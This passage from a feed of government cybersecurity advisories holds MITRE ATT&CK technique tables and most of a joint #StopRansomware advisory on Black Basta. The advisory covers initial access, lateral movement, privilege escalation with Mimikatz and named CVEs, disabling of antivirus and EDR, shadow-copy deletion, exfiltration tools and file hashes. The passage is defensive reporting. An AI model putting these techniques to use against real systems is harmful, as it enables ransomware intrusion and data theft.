<td>System Binary Proxy Execution: Mshta [T1218.005]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Software Packing [T1027.002]&nbsp;</td>
<td>System Binary Proxy Execution: Regsvr32 [T1218.010]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Steganography [T1027.003]&nbsp;</td>
<td>Subvert Trust Controls: Code Signing [T1553.002]&nbsp;</td>
</tr>
<tr>
<td>Obfuscated Files or Information: Compile After Delivery [T1027.004]&nbsp;</td>
<td>File and Directory Permissions Modifications: Linux and Mac File and Directory Permissions Modification [T1222.002] &nbsp;</td>
</tr>
<tr>
<td>Masquerading: Match Legitimate Name or Location [T1036.005]&nbsp;</td>
<td>Virtualisation/Sandbox Evasion: System Checks [T1497.001]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Thread Execution Hijacking [T1055.003]</td>
<td>Masquerading [T1036]</td>
</tr>
<tr>
<td>Reflective Code Loading [T1620]</td>
<td>Impair Defences: Disable or Modify System Firewall [T1562.004]&nbsp;</td>
</tr>
<tr>
<td>Process Injection: Process Hollowing [T1055.012]&nbsp;</td>
<td>Hide Artifacts: Hidden Files and Directories [T1564.001]&nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: File Deletion [T1070.004] &nbsp;</td>
<td>Hide Artifacts: Hidden Window [T1564.003] &nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: Timestomp [T1070.006] &nbsp;</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]&nbsp;</td>
</tr>
<tr>
<td>Indicator Removal: Clear Windows Event Logs [T1070.001]</td>
<td>Hijack Execution Flow: DLL Side-Loading [T1574.002]&nbsp;</td>
</tr>
<tr>
<td>Modify Registry [T1112]&nbsp;</td>
<td>Web Service [T1102]&nbsp;</td>
</tr>
<tr>
<td>Deobfuscate/Decode Files or Information [T1140]&nbsp;</td>
<td>Masquerading: Masquerade Task or Service [T1036.004]</td>
</tr>
<tr>
<td>Impair Defenses [T1562]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Credential Access (TA0006)</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping: LSASS Memory [T1003.001] &nbsp;</td>
<td>Unsecured Credentials: Credentials in Files [T1552.001]</td>
</tr>
<tr>
<td>OS Credential Dumping: NTDS [T1003.003] &nbsp;</td>
<td>Brute Force: Password Guessing [T1110.001]</td>
</tr>
<tr>
<td>Network Sniffing [T1040]&nbsp;</td>
<td>Forced Authentication [T1187]</td>
</tr>
<tr>
<td>Credentials from Password Stores: Keychain [T1555.001]</td>
<td>Steal or Forge Kerberos Tickets: Kerberoasting [T1558.003]&nbsp;</td>
</tr>
<tr>
<td>Input Capture: Keylogging [T1056.001]&nbsp;</td>
<td>Multi-Factor Authentication Interception [T1111]</td>
</tr>
<tr>
<td>Steal Web Session Cookie [T1539]&nbsp;</td>
<td>Steal Application Access Token [T1528]</td>
</tr>
<tr>
<td>Exploitation for Credential Access [T1212]</td>
<td>Brute Force: Password Cracking [T1110.002]</td>
</tr>
<tr>
<td>Input Capture: Web Portal Capture [T1056.003]</td>
<td>OS Credential Dumping: DCSync [T1003.006]</td>
</tr>
<tr>
<td>Credentials from Password Stores [T1555]&nbsp;</td>
<td>Credentials from Password Stores: Credentials from Web Browsers [T1555.003]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Discovery (TA0007)</th>
</tr>
</thead>
<tbody>
<tr>
<td>System Service Discovery [T1007]&nbsp;</td>
<td>System Information Discovery [T1082] &nbsp;</td>
</tr>
<tr>
<td>Application Window Discovery [T1010] &nbsp;</td>
<td>Account Discovery: Local Account [T1087.001] &nbsp;</td>
</tr>
<tr>
<td>Query Registry [T1012]&nbsp;</td>
<td>System Information Discovery, Technique T1082 - Enterprise | MITRE ATT&amp;CK®</td>
</tr>
<tr>
<td>File and Directory Discovery [T1083]</td>
<td>System Time Discovery [T1124]&nbsp;</td>
</tr>
<tr>
<td>Network Service Discovery [T1046]&nbsp;</td>
<td>System Owner/User Discovery [T1033]&nbsp;</td>
</tr>
<tr>
<td>Remote System Discovery [T1018]&nbsp;</td>
<td>Domain Trust Discovery [T1482]&nbsp;</td>
</tr>
<tr>
<td>Account Discovery: Email Account [T1087.003]</td>
<td>Account Discovery: Domain Account [T1087.002]</td>
</tr>
<tr>
<td>System Network Connections Discovery [T1049]&nbsp;</td>
<td>Virtualisation/Sandbox Evasion: System Checks [T1497.001]&nbsp;</td>
</tr>
<tr>
<td>Process Discovery [T1057]&nbsp;</td>
<td>Software Discovery [T1518]&nbsp;</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups [T1069.002]&nbsp;</td>
<td>Network Share Discovery, Technique T1135 - Enterprise | MITRE ATT&amp;CK®</td>
</tr>
<tr>
<td>System Network Configuration Discovery: Internet Connection Discovery [T1016.001]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Lateral Movement (TA0008)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services: Remote Desktop Protocol [T1021.001]&nbsp;</td>
<td>Remote Services [T1021]</td>
</tr>
<tr>
<td>Remote Services: SMB/Windows Admin Shares [T1021.002]&nbsp;</td>
<td>Use Alternate Authentication Material: Pass the Ticket [T1550.003]</td>
</tr>
<tr>
<td>Remote Services: Windows Remote Management [T1021.006]&nbsp;</td>
<td>Lateral Tool Transfer [T1570]&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Collection (TA0009)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Local System [T1005]&nbsp;</td>
<td>Archive Collected Data: Archive via Library [T1560.002]</td>
</tr>
<tr>
<td>Data from Network Shared Drive [T1039] &nbsp;</td>
<td>Email Collection: Remote Email Collection [T1114.002]&nbsp;</td>
</tr>
<tr>
<td>Input Capture: Keylogging [T1056.001]&nbsp;</td>
<td>Clipboard Data [T1115]&nbsp;</td>
</tr>
<tr>
<td>Automated Collection [T1119]</td>
<td>Data from Information Repositories [T1213]</td>
</tr>
<tr>
<td>Input Capture: Web Portal Capture [T1056.003]</td>
<td>Data Staged: Remote Data Staging [T1074.002]&nbsp;</td>
</tr>
<tr>
<td>Data Staged: Local Data Staging [T1074.001]&nbsp;</td>
<td>Archive Collected Data [T1560]</td>
</tr>
<tr>
<td>Email Collection [T1114]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Exfiltration (TA0010)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over C2 Channel [T1041] &nbsp;</td>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol [T1048.002]</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol [T1048]&nbsp;</td>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage [T1567.002]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Command and Control (TA0011)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Obfuscation: Protocol Impersonation [T1001.003]&nbsp;</td>
<td>Web Service: Dead Drop Resolver [T1102.001] &nbsp;</td>
</tr>
<tr>
<td>Commonly Used Port [T1043]&nbsp;</td>
<td>Web Service: One-way Communication [T1102.003]</td>
</tr>
<tr>
<td>Application Layer Protocol: Web Protocols [T1071.001]&nbsp;</td>
<td>Ingress Tool Transfer [T1105]&nbsp;</td>
</tr>
<tr>
<td>Application Layer Protocol: File Transfer Protocols [T1071.002]</td>
<td>Proxy: Internal Proxy [T1090.001]</td>
</tr>
<tr>
<td>Proxy: External Proxy [T1090.002]&nbsp;</td>
<td>Non-Standard Port [T1571]&nbsp;</td>
</tr>
<tr>
<td>Proxy: Multi-hop Proxy [T1090.003]&nbsp;</td>
<td>Protocol Tunnelling [T1572]&nbsp;</td>
</tr>
<tr>
<td>Web Service: Bidirectional Communication [T1102.002]&nbsp;</td>
<td>Encrypted Channel [T1573]&nbsp;</td>
</tr>
<tr>
<td>Encrypted Channel: Asymmetric Cryptography [T1573.002]</td>
<td>Ingress Tool Transfer [T1105]</td>
</tr>
<tr>
<td>Proxy, Technique T1090 - Enterprise | MITRE ATT&amp;CK®</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Impact (TA0040)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Service Stop [T1489]&nbsp;</td>
<td>Disk Wipe [T1561]</td>
</tr>
<tr>
<td>System Shutdown/Reboot [T1529]&nbsp;</td>
<td>Resource Hijacking [T1496]&nbsp;</td>
</tr>
</tbody>
</table>
<h2><strong>Notes</strong></h2>
<div>
<p>[1]&nbsp;U.S. Department of Justice. 2021.&nbsp;<a href=\"https://www.justice.gov/opa/pr/four-chinese-nationals-working-ministry-state-security-charged-global-computer-intrusion\" title=\"Four Chinese Nationals Working with the Ministry of State Security Charged with Global Computer Intrusion Campaign Targeting Intellectual Property and Confidential Business Information, Including Infectious Disease Research\">Four Chinese Nationals Working with the Ministry of State Security Charged with Global Computer Intrusion Campaign Targeting Intellectual Property and Confidential Business Information, Including Infectious Disease Research.</a><br>[2] In this context, an endpoint is a function of the web application.<br>[3] Service accounts are not tied to individual users, but rather to services. In a Microsoft corporate domain, there are various kinds of accounts.<br>[4] Mounting shares is the process of making files on a file system structure accessible to a user or user group.</p>
</div>
</div>
<p>&nbsp;</p>
") (pubDate nil "Mon, 08 Jul 2024 09:52:05 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21723")) (item nil (title nil "#StopRansomware: Black Basta") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a") (description nil "<h3><strong>SUMMARY</strong></h3>
<p><em><strong>Note</strong>: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Department of Health and Human Services (HHS), and Multi-State Information Sharing and Analysis Center (MS-ISAC) (hereafter referred to as the authoring organizations)&nbsp;are releasing this joint CSA to provide information on Black Basta, a ransomware variant whose actors have encrypted and stolen data from at least 12 out of 16 critical infrastructure sectors, including the Healthcare and Public Health (HPH) Sector.</p>
<p>This joint CSA provides TTPs and IOCs obtained from FBI investigations and third-party reporting. Black Basta is considered a ransomware-as-a-service (RaaS) variant and was first identified in April 2022.&nbsp;Black Basta affiliates have impacted a wide range of businesses and critical infrastructure in North America, Europe, and Australia. As of May 2024, Black Basta affiliates have impacted over 500 organizations globally.</p>
<p>Black Basta affiliates use common initial access techniques—such as phishing and exploiting known vulnerabilities—and then employ a double-extortion model, both encrypting systems and exfiltrating data. Ransom notes do not generally include an initial ransom demand or payment instructions. Instead, the notes provide victims with a unique code and instructs them to contact the ransomware group via a&nbsp;<code>.onion</code> URL (reachable through the Tor browser). Typically, the ransom notes give victims between 10 and 12 days to pay the ransom before the ransomware group publishes their data on the Black Basta TOR site, Basta News.</p>
<p>Healthcare organizations are attractive targets for cybercrime actors due to their size, technological dependence, access to personal health information, and unique impacts from patient care disruptions. The authoring organizations urge HPH Sector and all critical infrastructure organizations to apply the recommendations in the&nbsp;Mitigations section of this CSA to reduce the likelihood of compromise from Black Basta and other ransomware attacks. Victims of ransomware should report the incident to their local FBI field office or CISA (see the Reporting section for contact information).</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/aa24-131a-joint-csa-stopransomware-black-basta_2.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-131A #StopRansomware: Black Basta</a>
    <span class=\"c-file__size\">(PDF,       613.62 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-131a-joint-csa-stopransomware-black-basta_1_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-131A #StopRansomware: Black Basta - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       621.68 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-05/AA24-131A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-131A STIX XML</a>
    <span class=\"c-file__size\">(XML,       237.45 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-05/AA24-131A-StopRansomware-Black-Basta.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-131A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       180.78 KB
  )</span>
  </div>
</div>
<h3><strong>TECHNICAL DETAILS</strong></h3>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<h4><strong>Initial Access</strong></h4>
<p>Black Basta affiliates primarily use spearphishing [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566</a>] to obtain initial access. According to cybersecurity researchers, affiliates have also used <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-242a\" title=\"Identification and Disruption of QakBot Infrastructure\">Qakbot</a> during initial access.[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>]</p>
<p>Starting in February 2024, Black Basta affiliates began exploiting ConnectWise vulnerability <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1709\" title=\"CVE-2024-1709\">CVE-2024-1709</a> [<a href=\"https://cwe.mitre.org/data/definitions/288.html\" title=\"CWE-288: Authentication Bypass Using an Alternate Path or Channel\">CWE-288</a>] [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>]. In some instances, affiliates have been observed abusing valid credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].</p>
<h4><strong>Discovery and Execution</strong></h4>
<p>Black Basta affiliates use tools such as SoftPerfect network scanner (<code>netscan.exe</code>) to conduct network scanning. Cybersecurity researchers have observed affiliates conducting reconnaissance using utilities with innocuous file names such as <code>Intel</code> or <code>Dell</code>, left in the root drive <code>C:\\</code> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>].[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>]</p>
<h4><strong>Lateral Movement</strong></h4>
<p>Black Basta affiliates use tools such as BITSAdmin and PsExec, along with Remote Desktop Protocol (RDP), for lateral movement. Some affiliates also use tools like Splashtop, Screen Connect, and Cobalt Strike beacons to assist with remote access and lateral movement.</p>
<h4><strong>Privilege Escalation and Lateral Movement</strong></h4>
<p>Black Basta affiliates use credential scraping tools like Mimikatz for privilege escalation. According to cybersecurity researchers, Black Basta affiliates have also exploited ZeroLogon (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1472\" title=\"CVE-2020-1472\">CVE-2020-1472</a>, [<a href=\"https://cwe.mitre.org/data/definitions/330.html\" title=\"CWE-330: Use of Insufficiently Random Values\">CWE-330</a>]), NoPac (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-42278\" title=\"CVE-2021-42278\">CVE-2021-42278</a> [<a href=\"https://cwe.mitre.org/data/definitions/20.html\" title=\"CWE-20: Improper Input Validation\">CWE-20</a>] and <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-42287\" title=\"CVE-2021-42287\">CVE-2021-42287</a> [<a href=\"https://cwe.mitre.org/data/definitions/269.html\" title=\"CWE-269: Improper Privilege Management\">CWE-269</a>]), and PrintNightmare (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-34527\" title=\"CVE-2021-34527\">CVE-2021-34527</a>, [<a href=\"https://cwe.mitre.org/data/definitions/269.html\" title=\"CWE-269: Improper Privilege Management\">CWE-269</a>]) vulnerabilities for local and Windows Active Domain privilege escalation [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>].[<a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">1</a>],[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta\" title=\"Ransomware Spotlight: Black Basta\">2</a>]</p>
<h4><strong>Exfiltration and Encryption</strong></h4>
<p>Black Basta affiliates use RClone to facilitate data exfiltration prior to encryption. Prior to exfiltration,&nbsp;cybersecurity researchers have observed Black Basta affiliates using PowerShell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>] to disable antivirus products, and in some instances, deploying a tool called Backstab, designed to disable endpoint detection and response (EDR) tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].[<a href=\"https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\" title=\"Black Basta - Technical Analysis\">3</a>] Once antivirus programs are terminated, a ChaCha20 algorithm with an RSA-4096 public key fully encrypts files [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. A&nbsp;<code>.basta</code> or otherwise random file extension is added to file names and a ransom note titled&nbsp;<code>readme.txt</code> is left on the compromised system.[<a href=\"https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/black-basta\" title=\"Who Is Black Basta?\">4</a>] To further inhibit system recovery, affiliates use the&nbsp;<code>vssadmin.exe</code> program to delete volume shadow copies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>].[<a href=\"https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\" title=\"Threat Assessment: Black Basta Ransomware\">5</a>]</p>
<h4><strong>Leveraged Tools</strong></h4>
<p>See&nbsp;Table 1 for publicly available tools and applications&nbsp;used by Black Basta affiliates. This includes legitimate tools repurposed for their operations.</p>
<p><strong>Disclaimer:</strong> Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Used by Black Basta Affiliates</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Tool Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSAdmin</td>
<td>A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.</td>
</tr>
<tr>
<td>Cobalt Strike</td>
<td>A penetration testing tool used by security professions to test the security of networks and systems. Black Basta affiliates have used it to assist with lateral movement and file execution.</td>
</tr>
<tr>
<td>Mimikatz</td>
<td>A tool that allows users to view and save authentication credentials such as Kerberos tickets. Black Basta affiliates have used it to aid in privilege escalation.</td>
</tr>
<tr>
<td>PSExec</td>
<td>A tool designed to run programs and execute commands on remote systems.</td>
</tr>
<tr>
<td>PowerShell</td>
<td>A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td>RClone</td>
<td>A command line program used to sync files with cloud storage services such as Mega.</td>
</tr>
<tr>
<td>SoftPerfect</td>
<td>A network scanner (<code>netscan.exe</code>) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, Secure Shell (SSH) and PowerShell. It also scans for remote services, registry, files, and performance counters.&nbsp;</td>
</tr>
<tr>
<td>ScreenConnect</td>
<td>Remote support, access, and meeting software that allows users to control devices remotely over the internet.</td>
</tr>
<tr>
<td>Splashtop</td>
<td>Remote desktop software that allows remote access to devices for support, access, and collaboration.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Black Basta affiliates have used it to transfer data from a compromised network to actor-controlled accounts.</td>
</tr>
</tbody>
</table>
<h3><strong>MITRE ATT&amp;CK TACTICS AND TECHNIQUES</strong></h3>
<p>See Tables 2–6&nbsp;for all referenced threat actor tactics and techniques in this advisory.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Black Basta ATT&amp;CK Techniques for Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Phishing</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a></td>
<td>Black Basta affiliates have used spearphishing emails to obtain initial access.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v12/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>Black Basta affiliates have exploited ConnectWise vulnerability <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1709\" title=\"CVE-2024-1709\">CVE-2024-1709</a> to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Black Basta ATT&amp;CK Techniques for Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation for Privilege Escalation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a></td>
<td>Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Black Basta ATT&amp;CK Techniques for Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a></td>
<td>Black Basta affiliates have conducted reconnaissance using utilities with innocuous file names, such as <code>Intel</code> or <code>Dell</code>, to evade detection.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>
<p>Black Basta affiliates have deployed a tool called Backstab to disable endpoint detection and response (EDR) tooling.</p>
<p>Black Basta affiliates have used PowerShell to disable antivirus products.</p>
</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Black Basta ATT&amp;CK Techniques for Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>Black Basta affiliates have used PowerShell to disable antivirus products.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Black Basta ATT&amp;CK Techniques for Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Technique Title</strong></th>
<th role=\"columnheader\"><strong>ID</strong></th>
<th role=\"columnheader\"><strong>Use</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Inhibit System Recovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a></td>
<td>Black Basta affiliates have used the vssadmin.exe program to delete shadow copies.&nbsp;</td>
</tr>
<tr>
<td>Data Encrypted for Impact</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a></td>
<td>Black Basta affiliates have used a public key to fully encrypt files.&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
</div>
</div>
</div>
</div>
<h3><strong>INDICATORS OF COMPROMISE</strong></h3>
<p>See Table 7 for IOCs obtained from FBI investigations.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Malicious Files Associated with Black Basta Ransomware</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Hash</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0112e3b20872760dda5f658f6b546c85f126e803e27f0577b294f335ffa5a298</td>
<td>rclone.exe</td>
</tr>
<tr>
<td>d3683beca3a40574e5fd68d30451137e4a8bbaca8c428ebb781d565d6a70385e</td>
<td>Winscp.exe</td>
</tr>
<tr>
<td>88c8b472108e0d79d16a1634499c1b45048a10a38ee799054414613cc9dccccc</td>
<td>DLL</td>
</tr>
<tr>
<td>58ddbea084ce18cfb3439219ebcf2fc5c1605d2f6271610b1c7af77b8d0484bd</td>
<td>DLL</td>
</tr>
<tr>
<td>39939eacfbc20a2607064994497e3e886c90cd97b25926478434f46c95bd8ead</td>
<td>DLL</td>
</tr>
<tr>
<td>5b2178c7a0fd69ab00cef041f446e04098bbb397946eda3f6755f9d94d53c221</td>
<td>DLL</td>
</tr>
<tr>
<td>51eb749d6cbd08baf9d43c2f83abd9d4d86eb5206f62ba43b768251a98ce9d3e</td>
<td>DLL</td>
</tr>
<tr>
<td>d15bfbc181aac8ce9faa05c2063ef4695c09b718596f43edc81ca02ef03110d1</td>
<td>DLL</td>
</tr>
<tr>
<td>5942143614d8ed34567ea472c2b819777edd25c00b3e1b13b1ae98d7f9e28d43</td>
<td>DLL</td>
</tr>
<tr>
<td>05ebae760340fe44362ab7c8f70b2d89d6c9ba9b9ee8a9f747b2f19d326c3431</td>
<td>DLL</td>
</tr>
<tr>
<td>a7b36482ba5bca7a143a795074c432ed627d6afa5bc64de97fa660faa852f1a6</td>
<td>DLL</td>
</tr>
<tr>
